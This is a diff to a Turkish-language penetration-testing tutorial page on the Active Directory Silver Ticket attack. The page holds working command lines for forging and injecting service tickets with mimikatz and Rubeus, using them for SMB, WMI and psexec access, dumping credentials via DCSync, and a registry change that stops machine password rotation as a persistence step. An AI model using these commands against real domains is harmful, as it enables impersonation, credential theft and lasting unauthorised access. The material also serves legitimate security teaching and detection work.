@@ -6,7 +6,11 @@
 
 ## Silver ticket
 
-**Silver Ticket** saldırısı, Active Directory (AD) ortamlarında hizmet biletlerinin istismarını içerir. Bu yöntem, **bir hizmet hesabının NTLM hash'ini elde etmeye** dayanır, örneğin bir bilgisayar hesabı, bir Ticket Granting Service (TGS) bileti oluşturmak için. Bu sahte bilet ile bir saldırgan, ağdaki belirli hizmetlere erişebilir, **herhangi bir kullanıcıyı taklit ederek**, genellikle yönetici ayrıcalıkları elde etmeyi hedefler. Biletleri oluştururken AES anahtarlarının kullanılmasının daha güvenli ve daha az tespit edilebilir olduğu vurgulanmaktadır.
+**Silver Ticket** saldırısı, Active Directory (AD) ortamlarında hizmet biletlerinin istismarını içerir. Bu yöntem, bir Ticket Granting Service (TGS) bileti oluşturmak için **bir hizmet hesabının NTLM hash'ini edinmeye** dayanır; bu, bir bilgisayar hesabı gibi bir hizmet hesabı olabilir. Bu sahte bilet ile bir saldırgan, genellikle yönetici ayrıcalıkları hedefleyerek, ağdaki belirli hizmetlere **herhangi bir kullanıcıyı taklit ederek** erişebilir. Biletleri sahtelemek için AES anahtarlarının kullanılmasının daha güvenli ve daha az tespit edilebilir olduğu vurgulanmaktadır.
+
+> [!WARNING]
+> Silver Ticket'lar, yalnızca **hizmet hesabının hash'ini** gerektirdikleri için Golden Ticket'lara göre daha az tespit edilebilirler, krbtgt hesabını gerektirmezler. Ancak, hedefledikleri belirli hizmetle sınırlıdırlar. Ayrıca, sadece bir kullanıcının şifresini çalmak yeterlidir. 
+Ayrıca, bir **hesabın şifresini bir SPN ile ele geçirirseniz**, o şifreyi kullanarak o hizmete herhangi bir kullanıcıyı taklit eden bir Silver Ticket oluşturabilirsiniz.
 
 Bilet oluşturma için, işletim sistemine bağlı olarak farklı araçlar kullanılmaktadır:
 
@@ -18,6 +22,11 @@ python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
 ### Windows'ta
 ```bash
+# Using Rubeus
+## /ldap option is used to get domain data automatically
+## With /ptt we already load the tickt in memory
+rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
 
@@ -53,13 +62,17 @@ CIFS servisi, kurbanın dosya sistemine erişim için yaygın bir hedef olarak �
 - 4634: Hesap Çıkışı
 - 4672: Yönetici Girişi
 
+## Süreklilik
+
+Makinelerin her 30 günde bir şifrelerini değiştirmesini önlemek için `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ayarını yapabilir veya `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` değerini 30 günden daha büyük bir değere ayarlayarak makinelerin şifresinin ne zaman değiştirilmesi gerektiğini belirtebilirsiniz.
+
 ## Hizmet biletlerini kötüye kullanma
 
 Aşağıdaki örneklerde, biletin yönetici hesabını taklit ederek alındığını varsayalım.
 
 ### CIFS
 
-Bu bilet ile `C$` ve `ADMIN$` klasörlerine **SMB** üzerinden (eğer açığa çıkmışlarsa) erişim sağlayabilir ve uzaktaki dosya sisteminin bir kısmına dosyaları kopyalayabilirsiniz, sadece şunu yaparak:
+Bu bilet ile `C$` ve `ADMIN$` klasörlerine **SMB** üzerinden (eğer açığa çıkmışlarsa) erişebilir ve uzaktaki dosya sisteminin bir kısmına dosyaları kopyalayabilirsiniz, sadece şunu yaparak:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
@@ -97,7 +110,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Daha fazla bilgi için **wmiexec** hakkında aşağıdaki sayfayı inceleyin:
+Daha fazla bilgi için **wmiexec** hakkında aşağıdaki sayfaya bakın:
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
@@ -126,13 +139,17 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 ```
 **DCSync hakkında daha fazla bilgi edinin** aşağıdaki sayfada:
 
+{{#ref}}
+dcsync.md
+{{#endref}}
+
+
 ## Referanslar
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
 
-{{#ref}}
-dcsync.md
-{{#endref}}
+
 
 {{#include ../../banners/hacktricks-training.md}}
